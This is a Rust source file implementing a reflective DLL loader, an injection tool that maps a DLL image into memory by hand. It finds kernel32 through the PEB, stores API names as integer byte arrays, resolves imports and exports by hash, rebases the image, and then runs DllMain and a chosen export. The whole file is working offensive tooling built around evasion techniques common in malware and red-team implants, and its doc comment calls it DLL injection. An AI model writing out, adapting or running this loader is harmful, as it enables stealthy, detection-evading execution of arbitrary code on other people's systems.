use std::{arch::asm, mem::size_of, ffi::c_void};
use ntapi::{ntpebteb::PTEB, ntpsapi::PEB_LDR_DATA, ntldr::LDR_DATA_TABLE_ENTRY};
use num_traits::Num;
use windows_sys::{Win32::{Foundation::{HANDLE, HINSTANCE, FARPROC, BOOL}, System::{Memory::{VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS, PAGE_WRITECOPY, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MEM_COMMIT, MEM_RELEASE, VIRTUAL_FREE_TYPE}, SystemServices::{IMAGE_DOS_HEADER, DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG64, IMAGE_IMPORT_BY_NAME, IMAGE_EXPORT_DIRECTORY}, Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_SCN_MEM_WRITE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_EXECUTE, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_EXPORT}, WindowsProgramming::IMAGE_THUNK_DATA64}}, core::PCSTR};

#[allow(non_camel_case_types)]
type fnLoadLibraryA = unsafe extern "system" fn(
    lplibfilename: PCSTR
) -> HINSTANCE;

#[allow(non_camel_case_types)]
type fnGetProcAddress = unsafe extern "system" fn(
    hmodule: HINSTANCE, 
    lpprocname: PCSTR
) -> FARPROC;

#[allow(non_camel_case_types)]
type fnFlushInstructionCache = unsafe extern "system" fn(
    hprocess: HANDLE, 
    lpbaseaddress: *const c_void, 
    dwsize: usize
) -> BOOL;

#[allow(non_camel_case_types)]
type fnVirtualAlloc = unsafe extern "system" fn(
    lpaddress: *const c_void, 
    dwsize: usize, 
    flallocationtype: VIRTUAL_ALLOCATION_TYPE, 
    flprotect: PAGE_PROTECTION_FLAGS
) -> *mut c_void;

#[allow(non_camel_case_types)]
type fnVirtualProtect = unsafe extern "system" fn(
    lpaddress: *const c_void, 
    dwsize: usize, 
    flnewprotect: PAGE_PROTECTION_FLAGS, 
    lpfloldprotect: *mut PAGE_PROTECTION_FLAGS
) -> BOOL;

#[allow(non_camel_case_types)]
type fnVirtualFree = unsafe extern "system" fn(
    lpaddress: *mut c_void, 
    dwsize: usize, 
    dwfreetype: VIRTUAL_FREE_TYPE
) -> BOOL;

#[allow(non_camel_case_types)]
type fnExitThread = unsafe extern "system" fn(dwexitcode: u32) -> !;

#[allow(non_camel_case_types)]
type fnDllMain = unsafe extern "system" fn(
    module: HINSTANCE,
    call_reason: u32,
    reserved: *mut c_void,
) -> BOOL;

// Function pointers (Thanks B3NNY)
static mut LOAD_LIBRARY_A: Option<fnLoadLibraryA> = None;
static mut GET_PROC_ADDRESS: Option<fnGetProcAddress> = None;
static mut VIRTUAL_ALLOC: Option<fnVirtualAlloc> = None;
static mut VIRTUAL_PROTECT: Option<fnVirtualProtect> = None;
static mut FLUSH_INSTRUCTION_CACHE: Option<fnFlushInstructionCache> = None;
static mut VIRTUAL_FREE: Option<fnVirtualFree> = None;
static mut EXIT_THREAD: Option<fnExitThread> = None;

// User function (Change if parameters are changed)
#[allow(non_camel_case_types)]
type fnUserFunction = unsafe extern "system" fn(a: *mut c_void, b: u32);
static mut USER_FUNCTION: Option<fnUserFunction> = None;


/// Performs a Reflective DLL Injection
#[no_mangle]
pub extern "system" fn reflective_loader(image_bytes: *mut c_void, user_function_hash: u32, user_data: *mut c_void, user_data_length: u32) {

    let module_base = image_bytes as usize;

    if module_base == 0 {
        return;
    }

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32 };
    #[cfg(target_arch = "x86_64")]
    let nt_headers = unsafe { (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64 };

    //
    // Step 1) Load required modules and exports by name
    //

    if !set_exported_functions_by_name() {
        return;
    }

    //
    // Step 2) Allocate memory and copy sections and headers into the newly allocated memory
    //
    
    let new_module_base = unsafe { copy_sections_to_local_process(module_base) };

    if new_module_base.is_null() {
        return;
    }

    unsafe { copy_headers(module_base as _, new_module_base) }; //copy headers (remember to stomp dos headers later)

    //
    // Step 3) Process image relocations (rebase image)
    //

    unsafe { rebase_image(new_module_base) };

    //
    // Step 4) Process image import table (resolve imports)
    //

    unsafe { resolve_imports(new_module_base) };


    //
    // Step 5) Set protection for each section
    //

    let section_header = unsafe { 
        (&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *mut IMAGE_SECTION_HEADER 
    };

    for i in unsafe { 0..(*nt_headers).FileHeader.NumberOfSections } {
        let mut _protection = 0;
        let mut _old_protection = 0;
        // get a reference to the current _IMAGE_SECTION_HEADER
        let section_header_i = unsafe { &*(section_header.add(i as usize)) };

        // get the pointer to current section header's virtual address
        let destination = unsafe { new_module_base.cast::<u8>().add(section_header_i.VirtualAddress as usize) };

        // get the size of the current section header's data
        let size = section_header_i.SizeOfRawData as usize;

        if section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0 {
            _protection = PAGE_WRITECOPY;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0 {
            _protection = PAGE_READONLY;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0  {
            _protection = PAGE_READWRITE;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
            _protection = PAGE_EXECUTE;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0 {
            _protection = PAGE_EXECUTE_WRITECOPY;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0 {
            _protection = PAGE_EXECUTE_READ;
        }

        if section_header_i.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_WRITE != 0 && section_header_i.Characteristics & IMAGE_SCN_MEM_READ != 0 {
            _protection = PAGE_EXECUTE_READWRITE;
        }


        // Change memory protection for each section
        unsafe { VIRTUAL_PROTECT.unwrap()(destination as _, size, _protection, &mut _old_protection) };
    }

    // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
    unsafe { FLUSH_INSTRUCTION_CACHE.unwrap()(-1 as _, std::ptr::null_mut(), 0) };

    //
    // 6) Execute DllMain AND USER_FUNCTION
    //
    let entry_point = unsafe { new_module_base as usize + (*nt_headers).OptionalHeader.AddressOfEntryPoint as usize };
    
    #[allow(non_snake_case)]
    let DllMain = unsafe { std::mem::transmute::<_, fnDllMain>(entry_point) };

    unsafe { DllMain(new_module_base as _, DLL_PROCESS_ATTACH, module_base as _) };



    // Get USER_FUNCTION export by hash
    let user_function_address = unsafe { get_export_by_hash(new_module_base as _, user_function_hash) };

    // Make sure to add the arguments the reflective_loader and call the reflective loader. (TODO)
    unsafe { USER_FUNCTION = Some(std::mem::transmute::<_, fnUserFunction>(user_function_address)) };
    
    // Calling user function
    unsafe { USER_FUNCTION.unwrap()(user_data, user_data_length) };


    //Since we have resolved imports, we can call these normally (testing VirtualFree for now, will do exit thread later)
    
    // Free the bootstrap shellcode memory
    //unsafe { VIRTUAL_FREE.unwrap()(bootstrap_shellcode_address as _, 0, MEM_RELEASE) };
    // Does not work, maybe because can't free your own shellcode because memory is in use.

    // Exit the thread using the current exit code of the thread
    //unsafe { EXIT_THREAD.unwrap()(1) };
    // Does not work, not sure why.
}


/// Copy headers into the target memory location
#[no_mangle]
unsafe fn copy_headers(module_base: *const u8, new_module_base: *mut c_void) {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    for i in 0..(*nt_headers).OptionalHeader.SizeOfHeaders {
        new_module_base.cast::<u8>().add(i as usize).write(module_base.add(i as usize).read());
    }
}

/// Rebase the image / perform image base relocation
#[no_mangle]
unsafe fn rebase_image(module_base: *mut c_void) {

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    // Calculate the difference between remote allocated memory region where the image will be loaded and preferred ImageBase (delta)
    let delta = module_base as isize - (*nt_headers).OptionalHeader.ImageBase as isize;

    // Return early if delta is 0
    if delta == 0 {
        return;
    }

    // Resolve the imports of the newly allocated memory region 

    // Get a pointer to the first _IMAGE_BASE_RELOCATION
    let mut base_relocation = (module_base as usize 
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].VirtualAddress as usize) as *mut IMAGE_BASE_RELOCATION;
    
    // Get the end of _IMAGE_BASE_RELOCATION
    let base_relocation_end = base_relocation as usize 
        + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;
    
    while (*base_relocation).VirtualAddress != 0u32 && (*base_relocation).VirtualAddress as usize <= base_relocation_end && (*base_relocation).SizeOfBlock != 0u32 {
        
        // Get the VirtualAddress, SizeOfBlock and entries count of the current _IMAGE_BASE_RELOCATION block
        let address = (module_base as usize + (*base_relocation).VirtualAddress as usize) as isize;
        let item = (base_relocation as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
        let count = ((*base_relocation).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / std::mem::size_of::<u16>() as usize;

        for i in 0..count {
            // Get the Type and Offset from the Block Size field of the _IMAGE_BASE_RELOCATION block
            let type_field = (item.offset(i as isize).read() >> 12) as u32;
            let offset = item.offset(i as isize).read() & 0xFFF;

            //IMAGE_REL_BASED_DIR32 does not exist
            //#define IMAGE_REL_BASED_DIR64   10
            if type_field == IMAGE_REL_BASED_DIR64 || type_field == IMAGE_REL_BASED_HIGHLOW {
                // Add the delta to the value of each address where the relocation needs to be performed
                *((address + offset as isize) as *mut isize) += delta;
            }
        }

        // Get a pointer to the next _IMAGE_BASE_RELOCATION
        base_relocation = (base_relocation as usize + (*base_relocation).SizeOfBlock as usize) as *mut IMAGE_BASE_RELOCATION;
    }
}

/// Resolve the image imports
#[no_mangle]
unsafe fn resolve_imports(module_base: *mut c_void) {
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    // Get a pointer to the first _IMAGE_IMPORT_DESCRIPTOR
    let mut import_directory = (module_base as usize + (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize) as *mut IMAGE_IMPORT_DESCRIPTOR;
    
    while (*import_directory).Name != 0x0 {

        // Get the name of the dll in the current _IMAGE_IMPORT_DESCRIPTOR
        let dll_name = (module_base as usize + (*import_directory).Name as usize) as *const i8;

        // Load the DLL in the in the address space of the process by calling the function pointer LoadLibraryA
        let dll_handle = LOAD_LIBRARY_A.unwrap()(dll_name as _);

        // Get a pointer to the Original Thunk or First Thunk via OriginalFirstThunk or FirstThunk 
        let mut original_thunk = if (module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) != 0 {
            #[cfg(target_arch = "x86")]
            let orig_thunk = (module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
            #[cfg(target_arch = "x86_64")]
            let orig_thunk = (module_base as usize + (*import_directory).Anonymous.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA64;

            orig_thunk
        } else {
            #[cfg(target_arch = "x86")]
            let thunk = (module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
            #[cfg(target_arch = "x86_64")]
            let thunk = (module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;

            thunk
        };

        #[cfg(target_arch = "x86")]
        let mut thunk = (module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA32;
        #[cfg(target_arch = "x86_64")]
        let mut thunk = (module_base as usize + (*import_directory).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;
 
        while (*original_thunk).u1.Function != 0 {
            // #define IMAGE_SNAP_BY_ORDINAL64(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG64) != 0) or #define IMAGE_SNAP_BY_ORDINAL32(Ordinal) ((Ordinal & IMAGE_ORDINAL_FLAG32) != 0)
            #[cfg(target_arch = "x86")]
            let snap_result = ((*original_thunk).u1.Ordinal) & IMAGE_ORDINAL_FLAG32 != 0;
            #[cfg(target_arch = "x86_64")]
            let snap_result = ((*original_thunk).u1.Ordinal) & IMAGE_ORDINAL_FLAG64 != 0;

            if snap_result {
                //#define IMAGE_ORDINAL32(Ordinal) (Ordinal & 0xffff) or #define IMAGE_ORDINAL64(Ordinal) (Ordinal & 0xffff)
                let fn_ordinal = ((*original_thunk).u1.Ordinal & 0xffff) as *const u8;

                // Retrieve the address of the exported function from the DLL and ovewrite the value of "Function" in IMAGE_THUNK_DATA by calling function pointer GetProcAddress by ordinal
                (*thunk).u1.Function = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_ordinal).unwrap() as _; 
            } else {
                // Get a pointer to _IMAGE_IMPORT_BY_NAME
                let thunk_data = (module_base as usize + (*original_thunk).u1.AddressOfData as usize) as *mut IMAGE_IMPORT_BY_NAME;

                // Get a pointer to the function name in the IMAGE_IMPORT_BY_NAME
                let fn_name = (*thunk_data).Name.as_ptr();
                // Retrieve the address of the exported function from the DLL and ovewrite the value of "Function" in IMAGE_THUNK_DATA by calling function pointer GetProcAddress by name
                (*thunk).u1.Function = GET_PROC_ADDRESS.unwrap()(dll_handle, fn_name).unwrap() as _; // 
            }

            // Increment and get a pointer to the next Thunk and Original Thunk
            thunk = thunk.add(1);
            original_thunk = original_thunk.add(1);
        }

        // Increment and get a pointer to the next _IMAGE_IMPORT_DESCRIPTOR
        import_directory = (import_directory as usize + size_of::<IMAGE_IMPORT_DESCRIPTOR>() as usize) as _;
    }
}

// Copy sections of the dll to a memory location
#[no_mangle]
unsafe fn copy_sections_to_local_process(module_base: usize) -> *mut c_void { //Vec<u8>
    
    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;
    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let image_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
    let preferred_image_base_rva = (*nt_headers).OptionalHeader.ImageBase as *mut c_void;

    // Changed PAGE_EXECUTE_READWRITE to PAGE_READWRITE (This will require extra effort to set protection manually for each section shown in step 5
    let mut new_module_base = VIRTUAL_ALLOC.unwrap()(preferred_image_base_rva, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    
    if new_module_base.is_null() {
        new_module_base = VIRTUAL_ALLOC.unwrap()(std::ptr::null_mut(), image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    }

    // get a pointer to the _IMAGE_SECTION_HEADER
    let section_header = (&(*nt_headers).OptionalHeader as *const _ as usize + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize) as *mut IMAGE_SECTION_HEADER;


    for i in 0..(*nt_headers).FileHeader.NumberOfSections {
        // get a reference to the current _IMAGE_SECTION_HEADER
        let section_header_i = &*(section_header.add(i as usize));

        // get the pointer to current section header's virtual address
        //let destination = image.as_mut_ptr().add(section_header_i.VirtualAddress as usize);
        let destination = new_module_base.cast::<u8>().add(section_header_i.VirtualAddress as usize);
        
        // get a pointer to the current section header's data
        let source = module_base as usize + section_header_i.PointerToRawData as usize;
        
        // get the size of the current section header's data
        let size = section_header_i.SizeOfRawData as usize;

        // copy section headers into the local process (allocated memory)
        /* 
        std::ptr::copy_nonoverlapping(
            source as *const std::os::raw::c_void, // this causes problems if it is winapi::ctypes::c_void but ffi works for ffi
            destination as *mut _,
            size,
        )*/

        let source_data = core::slice::from_raw_parts(source as *const u8, size);
        
        for x in 0..size {
            let src_data = source_data[x];
            let dest_data = destination.add(x);
            *dest_data = src_data;
        }

    }

    new_module_base
}

#[no_mangle]
fn get_peb_ldr() -> usize {
    let teb: PTEB;
	unsafe {
        #[cfg(target_arch = "x86")]
		asm!("mov {teb}, fs:[0x18]", teb = out(reg) teb);

		#[cfg(target_arch = "x86_64")]
		asm!("mov {teb}, gs:[0x30]", teb = out(reg) teb);
	}

	let teb = unsafe { &mut *teb };
	let peb = unsafe { &mut *teb.ProcessEnvironmentBlock };
	let peb_ldr = peb.Ldr;

    peb_ldr as _
}

/// Gets the modules and module exports by name and saves their addresses
#[no_mangle]
pub fn set_exported_functions_by_name() -> bool {
    /*
        let test = "ntdll.dll\0";
        let test_bytes = test.as_bytes();
        println!("{:?}", test.len());
        println!("{:?}", test);
    */
    let kernel32_bytes: [u16; 13] = [75, 69, 82, 78, 69, 76, 51, 50, 46, 68, 76, 76, 0];
    //let ntdll_bytes: [u16; 10] = [110, 116, 100, 108, 108, 46, 100, 108, 108, 0];

    let load_librarya_bytes: [i8; 13] = [76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 65, 0];
    let get_proc_address_bytes: [i8; 15] = [71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0];
    let virtual_alloc_bytes: [i8; 13] = [86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99, 0];
    let virtual_protect_bytes: [i8; 15] = [86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0];
    let flush_instruction_cache_bytes: [i8; 22] = [70, 108, 117, 115, 104, 73, 110, 115, 116, 114, 117, 99, 116, 105, 111, 110, 67, 97, 99, 104, 101, 0];
    let virtual_free_bytes: [i8; 12] = [86, 105, 114, 116, 117, 97, 108, 70, 114, 101, 101, 0];
    let exit_thread_bytes: [i8; 11] = [69, 120, 105, 116, 84, 104, 114, 101, 97, 100, 0];

    // get kernel32 base address via name
    let kernel32_base = unsafe { get_loaded_modules_by_name(kernel32_bytes.as_ptr()) };

    // get ntdll base address via name
    //let ntdll_base = unsafe {  get_loaded_modules_by_name(ntdll_bytes.as_ptr()) }; 

    if kernel32_base.is_null() { // ntdll_base.is_null() || kernel32_base.is_null()
        return false;
    }

    // get exports by name and store the their virtual address
    let loadlibrarya_address = unsafe { get_export_by_name(kernel32_base, load_librarya_bytes.as_ptr()) };
    unsafe { LOAD_LIBRARY_A = Some(std::mem::transmute::<_, fnLoadLibraryA>(loadlibrarya_address)) };

    let getprocaddress_address = unsafe { get_export_by_name(kernel32_base, get_proc_address_bytes.as_ptr()) };
    unsafe { GET_PROC_ADDRESS = Some(std::mem::transmute::<_, fnGetProcAddress>(getprocaddress_address)) };

    let virtualalloc_address = unsafe { get_export_by_name(kernel32_base, virtual_alloc_bytes.as_ptr()) };
    unsafe { VIRTUAL_ALLOC = Some(std::mem::transmute::<_, fnVirtualAlloc>(virtualalloc_address)) };

    let virtualprotect_address = unsafe { get_export_by_name(kernel32_base, virtual_protect_bytes.as_ptr()) };
    unsafe { VIRTUAL_PROTECT = Some(std::mem::transmute::<_, fnVirtualProtect>(virtualprotect_address)) };

    let flushinstructioncache_address = unsafe { get_export_by_name(kernel32_base, flush_instruction_cache_bytes.as_ptr()) };
    unsafe { FLUSH_INSTRUCTION_CACHE = Some(std::mem::transmute::<_, fnFlushInstructionCache>(flushinstructioncache_address)) };

    let flushinstructioncache_address = unsafe { get_export_by_name(kernel32_base, flush_instruction_cache_bytes.as_ptr()) };
    unsafe { FLUSH_INSTRUCTION_CACHE = Some(std::mem::transmute::<_, fnFlushInstructionCache>(flushinstructioncache_address)) };

    let virtualfree_address = unsafe { get_export_by_name(kernel32_base, virtual_free_bytes.as_ptr()) };
    unsafe { VIRTUAL_FREE = Some(std::mem::transmute::<_, fnVirtualFree>(virtualfree_address)) };

    let exitthread_address = unsafe { get_export_by_name(kernel32_base, exit_thread_bytes.as_ptr()) };
    unsafe { EXIT_THREAD = Some(std::mem::transmute::<_, fnExitThread>(exitthread_address)) };


    if loadlibrarya_address == 0 || getprocaddress_address == 0 || virtualalloc_address == 0 || 
        virtualprotect_address == 0 || flushinstructioncache_address == 0 || virtualfree_address == 0 || exitthread_address == 0 {
        return false;
    }

    return true;
}

/// Gets loaded modules by name
#[no_mangle]
pub unsafe fn get_loaded_modules_by_name(module_name: *const u16) -> *mut u8 {
    let peb_ptr_ldr_data = get_peb_ldr() as *mut PEB_LDR_DATA;
	
    let mut module_list = (*peb_ptr_ldr_data).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while !(*module_list).DllBase.is_null() {

        let dll_name = (*module_list).BaseDllName.Buffer;
        
        if compare_raw_str(module_name, dll_name) {
            return (*module_list).DllBase as _;
		}

        module_list = (*module_list).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
	}

    return std::ptr::null_mut();
}

//Credits: 2vg / shoya
pub fn compare_raw_str<T>(s: *const T, u: *const T) -> bool
where
    T: Num,
{
    unsafe {
        let u_len = (0..).take_while(|&i| !(*u.offset(i)).is_zero()).count();
        let u_slice = core::slice::from_raw_parts(u, u_len);

        let s_len = (0..).take_while(|&i| !(*s.offset(i)).is_zero()).count();
        let s_slice = core::slice::from_raw_parts(s, s_len);

        if s_len != u_len {
            return false;
        }
        for i in 0..s_len {
            if s_slice[i] != u_slice[i] {
                return false;
            }
        }
        return true;
    }
}

/// Gets the address of a function by name
#[no_mangle]
unsafe fn get_export_by_name(module_base: *mut u8, module_name: *const i8) -> usize {

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;

    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = (module_base as usize
        + (*nt_headers).OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize)
        as *mut IMAGE_EXPORT_DIRECTORY;

    let names = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNames as usize)
            as *const u32,
        (*export_directory).NumberOfNames as _,
    );

    let functions = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfFunctions as usize)
            as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );

    let ordinals = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize)
            as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    for i in 0..(*export_directory).NumberOfNames {

        let name = (module_base as usize + names[i as usize] as usize) as *const i8;

        if compare_raw_str(module_name, name as _) {
            let ordinal = ordinals[i as usize] as usize;
            return module_base as usize + functions[ordinal] as usize;
        }
    }  
    return 0;
}

//credits: janoglezcampos / @httpyxel / yxel
pub const fn hash(buffer : &[u8]) -> u32
{   
	let mut hsh : u32   = 5381;
    let mut iter: usize = 0;
    let mut cur : u8; 

	while iter < buffer.len()
	{   
        cur = buffer[iter];
        if cur == 0 {
            iter += 1;
            continue;
        }
        if cur >= ('a' as u8) {
			cur -= 0x20;
        }
		hsh = ((hsh << 5).wrapping_add(hsh)) + cur as u32;
        iter += 1;
	};
	return hsh;
}

/// Gets the address of a function by hash
#[no_mangle]
unsafe fn get_export_by_hash(module_base: *mut u8, module_name_hash: u32) -> usize {

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;

    #[cfg(target_arch = "x86")]
    let nt_headers =  (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS32;

    #[cfg(target_arch = "x86_64")]
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = (module_base as usize
        + (*nt_headers).OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize)
        as *mut IMAGE_EXPORT_DIRECTORY;

    let names = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNames as usize)
            as *const u32,
        (*export_directory).NumberOfNames as _,
    );

    let functions = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfFunctions as usize)
            as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );

    let ordinals = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize)
            as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    for i in 0..(*export_directory).NumberOfNames {

        let name_addr = (module_base as usize + names[i as usize] as usize) as *const i8;
        let name_len = get_cstr_len(name_addr as _);
        let name_slice: &[u8] = core::slice::from_raw_parts(name_addr as _, name_len);

        if module_name_hash == hash(name_slice) {
            let ordinal = ordinals[i as usize] as usize;
            return module_base as usize + functions[ordinal] as usize;
        }
    }  
    return 0;
}

//credits: janoglezcampos / @httpyxel / yxel
pub fn get_cstr_len(pointer: *const char) -> usize{
    let mut tmp: u64 = pointer as u64;
    unsafe {
        while *(tmp as *const u8) != 0{
            tmp += 1;
        }
    }
    (tmp - pointer as u64) as _
}